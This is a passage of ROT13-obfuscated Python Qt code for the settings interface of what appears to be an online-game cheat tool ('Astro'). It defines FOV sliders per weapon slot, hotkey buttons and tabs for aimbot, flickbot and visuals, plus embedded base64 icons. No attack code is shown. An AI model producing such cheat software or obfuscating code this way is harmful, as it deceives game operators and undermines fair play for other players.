        frys.fyvqre_fybg3.frgFglyrFurrg(frys.trg_fyvqre_fglyr())
        frys.fyvqre_fybg3.frgZnkvzhzJvqgu(80)
        frys.fyvqre_fybg3.frgZvavzhzJvqgu(80)
        frys.fyvqre_fybg3.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.fyvqre_fybg3.frgZvavzhz(120)
        frys.fyvqre_fybg3.frgZnkvzhz(800)
        frys.fyvqre_fybg3.frgInyhr(vag(ebhaq(Sbi_Fvmr_Fybg3)))

        frys.Sbi_Fvmr_ynory_fybg4 = DYnory(s"SBI: {fge(Sbi_Fvmr_Fybg4)}")
        frys.fyvqre_fybg4 = DFyvqre(Dg.Ubevmbagny)
        frys.fyvqre_fybg4.frgFglyrFurrg(frys.trg_fyvqre_fglyr())
        frys.fyvqre_fybg4.frgZnkvzhzJvqgu(80)
        frys.fyvqre_fybg4.frgZvavzhzJvqgu(80)
        frys.fyvqre_fybg4.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.fyvqre_fybg4.frgZvavzhz(120)
        frys.fyvqre_fybg4.frgZnkvzhz(800)
        frys.fyvqre_fybg4.frgInyhr(vag(ebhaq(Sbi_Fvmr_Fybg4)))

        frys.Sbi_Fvmr_ynory_fybg5 = DYnory(s"SBI: {fge(Sbi_Fvmr_Fybg5)}")
        frys.fyvqre_fybg5 = DFyvqre(Dg.Ubevmbagny)
        frys.fyvqre_fybg5.frgFglyrFurrg(frys.trg_fyvqre_fglyr())
        frys.fyvqre_fybg5.frgZnkvzhzJvqgu(80)
        frys.fyvqre_fybg5.frgZvavzhzJvqgu(80)
        frys.fyvqre_fybg5.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.fyvqre_fybg5.frgZvavzhz(120)
        frys.fyvqre_fybg5.frgZnkvzhz(800)
        frys.fyvqre_fybg5.frgInyhr(vag(ebhaq(Sbi_Fvmr_Fybg5)))

        xrl_anzr_pbairegrq_fybg1 = XRL_ANZRF.trg(Fybg1_Xrlovaq, s"0k{Fybg1_Xrlovaq:02K}")
        frys.ubgxrl_ynory_fybg1 = DYnory("Fybg 1")
        vf_fryrpgvat_ubgxrl_fybg1 = Snyfr
        frys.oga_ubgxrl_fybg1 = DChfuOhggba(s"{xrl_anzr_pbairegrq_fybg1}")
        frys.oga_ubgxrl_fybg1.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.oga_ubgxrl_fybg1.frgFglyrFurrg(frys.trg_ohggba_fglyr())
        frys.oga_ubgxrl_fybg1.frgZvavzhzJvqgu(40)
        frys.oga_ubgxrl_fybg1.pyvpxrq.pbaarpg(frys.fgneg_fryrpg_ubgxrl_fybg1)

        xrl_anzr_pbairegrq_fybg2 = XRL_ANZRF.trg(Fybg2_Xrlovaq, s"0k{Fybg2_Xrlovaq:02K}")
        frys.ubgxrl_ynory_fybg2 = DYnory("Fybg 2")
        vf_fryrpgvat_ubgxrl_fybg2 = Snyfr
        frys.oga_ubgxrl_fybg2 = DChfuOhggba(s"{xrl_anzr_pbairegrq_fybg2}")
        frys.oga_ubgxrl_fybg2.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.oga_ubgxrl_fybg2.frgFglyrFurrg(frys.trg_ohggba_fglyr())
        frys.oga_ubgxrl_fybg2.frgZvavzhzJvqgu(40)
        frys.oga_ubgxrl_fybg2.pyvpxrq.pbaarpg(frys.fgneg_fryrpg_ubgxrl_fybg2)

        xrl_anzr_pbairegrq_fybg3 = XRL_ANZRF.trg(Fybg3_Xrlovaq, s"0k{Fybg3_Xrlovaq:02K}")
        frys.ubgxrl_ynory_fybg3 = DYnory("Fybg 3")
        vf_fryrpgvat_ubgxrl_fybg3 = Snyfr
        frys.oga_ubgxrl_fybg3 = DChfuOhggba(s"{xrl_anzr_pbairegrq_fybg3}")
        frys.oga_ubgxrl_fybg3.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.oga_ubgxrl_fybg3.frgFglyrFurrg(frys.trg_ohggba_fglyr())
        frys.oga_ubgxrl_fybg3.frgZvavzhzJvqgu(40)
        frys.oga_ubgxrl_fybg3.pyvpxrq.pbaarpg(frys.fgneg_fryrpg_ubgxrl_fybg3)

        xrl_anzr_pbairegrq_fybg4 = XRL_ANZRF.trg(Fybg4_Xrlovaq, s"0k{Fybg4_Xrlovaq:02K}")
        frys.ubgxrl_ynory_fybg4 = DYnory("Fybg 4")
        vf_fryrpgvat_ubgxrl_fybg4 = Snyfr
        frys.oga_ubgxrl_fybg4 = DChfuOhggba(s"{xrl_anzr_pbairegrq_fybg4}")
        frys.oga_ubgxrl_fybg4.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.oga_ubgxrl_fybg4.frgFglyrFurrg(frys.trg_ohggba_fglyr())
        frys.oga_ubgxrl_fybg4.frgZvavzhzJvqgu(40)
        frys.oga_ubgxrl_fybg4.pyvpxrq.pbaarpg(frys.fgneg_fryrpg_ubgxrl_fybg4)

        xrl_anzr_pbairegrq_fybg5 = XRL_ANZRF.trg(Fybg5_Xrlovaq, s"0k{Fybg5_Xrlovaq:02K}")
        frys.ubgxrl_ynory_fybg5 = DYnory("Fybg 5")
        vf_fryrpgvat_ubgxrl_fybg5 = Snyfr
        frys.oga_ubgxrl_fybg5 = DChfuOhggba(s"{xrl_anzr_pbairegrq_fybg5}")
        frys.oga_ubgxrl_fybg5.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.oga_ubgxrl_fybg5.frgFglyrFurrg(frys.trg_ohggba_fglyr())
        frys.oga_ubgxrl_fybg5.frgZvavzhzJvqgu(40)
        frys.oga_ubgxrl_fybg5.pyvpxrq.pbaarpg(frys.fgneg_fryrpg_ubgxrl_fybg5)

        xrl_anzr_pbairegrq_fybg6 = XRL_ANZRF.trg(Fybg6_Xrlovaq, s"0k{Fybg6_Xrlovaq:02K}")
        frys.ubgxrl_ynory_fybg6 = DYnory("Cvpxnkr  ")
        vf_fryrpgvat_ubgxrl_fybg6 = Snyfr
        frys.oga_ubgxrl_fybg6 = DChfuOhggba(s"{xrl_anzr_pbairegrq_fybg6}")
        frys.oga_ubgxrl_fybg6.frgSbphfCbyvpl(Dg.AbSbphf)
        frys.oga_ubgxrl_fybg6.frgFglyrFurrg(frys.trg_ohggba_fglyr())
        frys.oga_ubgxrl_fybg6.frgZvavzhzJvqgu(40)
        frys.oga_ubgxrl_fybg6.pyvpxrq.pbaarpg(frys.fgneg_fryrpg_ubgxrl_fybg6)

        ohggba_pbagnvare = DJvqtrg()
        ohggba_pbagnvare_ynlbhg = DUObkYnlbhg(ohggba_pbagnvare)
        oga_nvzobg = DChfuOhggba()
        oga_nvzobg.frgBowrpgAnzr("zrah_gno_nvzobg")
        oga_nvzobg.frgVpba(DVpba(s"P:\\CebtenzQngn\\Nfgeb\\Nffrgf\\Vzntrf\\fxhyy.cat"))
        oga_nvzobg.frgVpbaFvmr(DFvmr(19, 19))
        oga_nvzobg.frgSbphfCbyvpl(Dg.AbSbphf)
        oga_nvzobg.frgFglyrFurrg(frys.zrah_gno_fryrpgrq_fglyr())
        oga_fybgf = DChfuOhggba()
        oga_fybgf.frgBowrpgAnzr("zrah_gno_fybgf")
        oga_fybgf.frgVpba(DVpba(s"P:\\CebtenzQngn\\Nfgeb\\Nffrgf\\Vzntrf\\tha.cat"))
        oga_fybgf.frgVpbaFvmr(DFvmr(21, 21))
        oga_fybgf.frgSbphfCbyvpl(Dg.AbSbphf)
        oga_fybgf.frgFglyrFurrg(zrah_gno_fglyr)
        oga_syvpxobg = DChfuOhggba()
        oga_syvpxobg.frgVpba(DVpba(s"P:\\CebtenzQngn\\Nfgeb\\Nffrgf\\Vzntrf\\ohyyrg.cat"))
        oga_syvpxobg.frgVpbaFvmr(DFvmr(19, 19))
        oga_syvpxobg.frgBowrpgAnzr("zrah_gno_syvpxobg")
        oga_syvpxobg.frgSbphfCbyvpl(Dg.AbSbphf)
        oga_syvpxobg.frgFglyrFurrg(zrah_gno_fglyr)
        oga_ivfhny = DChfuOhggba()
        oga_ivfhny.frgBowrpgAnzr("zrah_gno_ivfhny")
        oga_ivfhny.frgVpba(DVpba(s"P:\\CebtenzQngn\\Nfgeb\\Nffrgf\\Vzntrf\\ivrj.cat"))
        oga_ivfhny.frgVpbaFvmr(DFvmr(20, 20))
        oga_ivfhny.frgSbphfCbyvpl(Dg.AbSbphf)
        oga_ivfhny.frgFglyrFurrg(zrah_gno_fglyr)
        oga_rkgen = DChfuOhggba()
        oga_rkgen.frgVpba(DVpba(s"P:\\CebtenzQngn\\Nfgeb\\Nffrgf\\Vzntrf\\nccyvpngvba.cat"))
        oga_rkgen.frgVpbaFvmr(DFvmr(19, 19))
        oga_rkgen.frgBowrpgAnzr("zrah_gno_rkgen")
        oga_rkgen.frgSbphfCbyvpl(Dg.AbSbphf)
        oga_rkgen.frgFglyrFurrg(zrah_gno_fglyr)
        oga_cebsvyr = DChfuOhggba()
        oga_cebsvyr.frgVpba(DVpba(s"P:\\CebtenzQngn\\Nfgeb\\Nffrgf\\Vzntrf\\cebsvyr.cat"))
        oga_cebsvyr.frgVpbaFvmr(DFvmr(19, 19))
        oga_cebsvyr.frgBowrpgAnzr("zrah_gno_cebsvyr")
        oga_cebsvyr.frgSbphfCbyvpl(Dg.AbSbphf)
        oga_cebsvyr.frgFglyrFurrg(zrah_gno_fglyr)
        oga_nqinaprq = DChfuOhggba()
        oga_nqinaprq.frgVpba(DVpba(s"P:\\CebtenzQngn\\Nfgeb\\Nffrgf\\Vzntrf\\oenva.cat"))
        oga_nqinaprq.frgVpbaFvmr(DFvmr(19, 19))
        oga_nqinaprq.frgBowrpgAnzr("zrah_gno_nqinaprq")
        oga_nqinaprq.frgSbphfCbyvpl(Dg.AbSbphf)
        oga_nqinaprq.frgFglyrFurrg(zrah_gno_fglyr)
        oga_pbasvt = DChfuOhggba()
        oga_pbasvt.frgVpba(DVpba(s"P:\\CebtenzQngn\\Nfgeb\\Nffrgf\\Vzntrf\\trne.cat"))
        oga_pbasvt.frgVpbaFvmr(DFvmr(20, 20))
        oga_pbasvt.frgBowrpgAnzr("zrah_gno_nqinaprq")
        oga_pbasvt.frgSbphfCbyvpl(Dg.AbSbphf)
        oga_pbasvt.frgFglyrFurrg(zrah_gno_fglyr)
        ohggba_pbagnvare_ynlbhg.nqqJvqtrg(oga_nvzobg)
        ohggba_pbagnvare_ynlbhg.nqqJvqtrg(oga_fybgf)
        ohggba_pbagnvare_ynlbhg.nqqJvqtrg(oga_syvpxobg)
        ohggba_pbagnvare_ynlbhg.nqqJvqtrg(oga_ivfhny)
        ohggba_pbagnvare_ynlbhg.nqqJvqtrg(oga_rkgen)
        ohggba_pbagnvare_ynlbhg.nqqJvqtrg(oga_cebsvyr)
        ohggba_pbagnvare_ynlbhg.nqqJvqtrg(oga_nqinaprq)
        #ohggba_pbagnvare_ynlbhg.nqqJvqtrg(oga_pbasvt)
        ohggba_pbagnvare_ynlbhg.frgPbagragfZnetvaf(0, 0, 0, 2)
        frys.hcqngr_zrah_gno_fglyr()

        frcnengbe_yvar = DSenzr()
        frcnengbe_yvar.frgFglyrFurrg("onpxtebhaq-pbybe: #2p2p2p; urvtug: 1ck;")
        frcnengbe_yvar.frgSenzrFuncr(DSenzr.UYvar)
        frcnengbe_yvar.frgSenzrFunqbj(DSenzr.Fhaxra)
        frcnengbe_yvar1 = DSenzr()
        frcnengbe_yvar1.frgFglyrFurrg("onpxtebhaq-pbybe: #393939; urvtug: 1ck;")
        frcnengbe_yvar1.frgSenzrFuncr(DSenzr.UYvar)
        frcnengbe_yvar1.frgSenzrFunqbj(DSenzr.Fhaxra)
        frcnengbe_yvar2 = DSenzr()
        frcnengbe_yvar2.frgFglyrFurrg("onpxtebhaq-pbybe: #2p2p2p; urvtug: 1ck;")
        frcnengbe_yvar2.frgSenzrFuncr(DSenzr.UYvar)
        frcnengbe_yvar2.frgSenzrFunqbj(DSenzr.Fhaxra)
        frcnengbe_yvar3 = DSenzr()
        frcnengbe_yvar3.frgFglyrFurrg("onpxtebhaq-pbybe: #393939; urvtug: 1ck;")
        frcnengbe_yvar3.frgSenzrFuncr(DSenzr.UYvar)
        frcnengbe_yvar3.frgSenzrFunqbj(DSenzr.Fhaxra)
        frcnengbe_yvar4 = DSenzr()
        frcnengbe_yvar4.frgFglyrFurrg("onpxtebhaq-pbybe: #2p2p2p; urvtug: 1ck;")
        frcnengbe_yvar4.frgSenzrFuncr(DSenzr.UYvar)
        frcnengbe_yvar4.frgSenzrFunqbj(DSenzr.Fhaxra)
        frcnengbe_yvar5 = DSenzr()
        frcnengbe_yvar5.frgFglyrFurrg("onpxtebhaq-pbybe: #393939; urvtug: 1ck;")
        frcnengbe_yvar5.frgSenzrFuncr(DSenzr.UYvar)
        frcnengbe_yvar5.frgSenzrFunqbj(DSenzr.Fhaxra)
        frcnengbe_yvar6 = DSenzr()
        frcnengbe_yvar6.frgFglyrFurrg("onpxtebhaq-pbybe: #2p2p2p; urvtug: 1ck;")
        frcnengbe_yvar6.frgSenzrFuncr(DSenzr.UYvar)
        frcnengbe_yvar6.frgSenzrFunqbj(DSenzr.Fhaxra)
        frcnengbe_yvar7 = DSenzr()
        frcnengbe_yvar7.frgFglyrFurrg("onpxtebhaq-pbybe: #393939; urvtug: 1ck;")
        frcnengbe_yvar7.frgSenzrFuncr(DSenzr.UYvar)
        frcnengbe_yvar7.frgSenzrFunqbj(DSenzr.Fhaxra)
        frcnengbe_yvar8 = DSenzr()
        frcnengbe_yvar8.frgFglyrFurrg("onpxtebhaq-pbybe: #393939; urvtug: 1ck;")
        frcnengbe_yvar8.frgSenzrFuncr(DSenzr.UYvar)
        frcnengbe_yvar8.frgSenzrFunqbj(DSenzr.Fhaxra)
        frcnengbe_yvar9 = DSenzr()
        frcnengbe_yvar9.frgFglyrFurrg("onpxtebhaq-pbybe: #2p2p2p; urvtug: 1ck;")
        frcnengbe_yvar9.frgSenzrFuncr(DSenzr.UYvar)
        frcnengbe_yvar9.frgSenzrFunqbj(DSenzr.Fhaxra)

        frcnengbe_yvar10 = DSenzr()
        frcnengbe_yvar10.frgFglyrFurrg("onpxtebhaq-pbybe: #393939; urvtug: 1ck;")
        frcnengbe_yvar10.frgSenzrFuncr(DSenzr.UYvar)
        frcnengbe_yvar10.frgSenzrFunqbj(DSenzr.Fhaxra)

        frcnengbe_yvar11 = DSenzr()
        frcnengbe_yvar11.frgFglyrFurrg("onpxtebhaq-pbybe: #393939; urvtug: 1ck;")
        frcnengbe_yvar11.frgSenzrFuncr(DSenzr.UYvar)
        frcnengbe_yvar11.frgSenzrFunqbj(DSenzr.Fhaxra)

        frcnengbe_yvar12 = DSenzr()
        frcnengbe_yvar12.frgFglyrFurrg("onpxtebhaq-pbybe: #2p2p2p; urvtug: 1ck;")
        frcnengbe_yvar12.frgSenzrFuncr(DSenzr.UYvar)
        frcnengbe_yvar12.frgSenzrFunqbj(DSenzr.Fhaxra)

        frcnengbe_yvar13 = DSenzr()
        frcnengbe_yvar13.frgFglyrFurrg("onpxtebhaq-pbybe: #2p2p2p; urvtug: 1ck;")
        frcnengbe_yvar13.frgSenzrFuncr(DSenzr.UYvar)
        frcnengbe_yvar13.frgSenzrFunqbj(DSenzr.Fhaxra)

        frcnengbe_yvar14 = DSenzr()
        frcnengbe_yvar14.frgFglyrFurrg("onpxtebhaq-pbybe: #2p2p2p; urvtug: 1ck;")
        frcnengbe_yvar14.frgSenzrFuncr(DSenzr.UYvar)
        frcnengbe_yvar14.frgSenzrFunqbj(DSenzr.Fhaxra)

        # Perngr gur onaare ynlbhg
        onaare_ynlbhg = DIObkYnlbhg()
        frys.onaareqq = DYnory(frys)
        vzntr_svyrf = [
            #"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